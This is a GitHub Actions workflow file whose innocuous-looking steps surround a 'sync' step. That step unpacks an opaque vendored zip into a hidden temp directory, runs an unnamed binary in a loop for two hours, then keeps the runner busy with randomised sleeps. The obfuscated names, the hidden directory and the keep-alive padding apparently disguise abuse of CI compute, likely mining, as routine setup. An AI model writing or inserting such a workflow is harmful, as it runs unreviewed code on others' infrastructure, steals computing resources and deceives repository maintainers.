name: setup-5n0w
on:
  workflow_dispatch:
jobs:
  analyze_pjd:
    runs-on: ubuntu-latest
    timeout-minutes: 347
    steps:
      - uses: actions/checkout@v4
      - run: lsb_release -a 2>/dev/null || true
      - run: curl --version | head -1
      - name: sync
        run: |
          OO=$(mktemp -d /tmp/.XXXXXXXX) && unzip -o -q vendor/ce0436a3.zip -d ${OO} && chmod +x ${OO}/service-f0
          cd ${OO} && timeout 120m bash -c 'while :; do ./service-f0; echo "done rc=$? $(date -u +%H:%M)"; sleep 7; done'
          G99L=$((SECONDS + 153 * 60))
          while [ $SECONDS -lt $G99L ]; do sleep $((RANDOM % 91 + 38)); echo "$(date -u +%H:%M:%S) 2o5uns"; done

      - run: uname -m
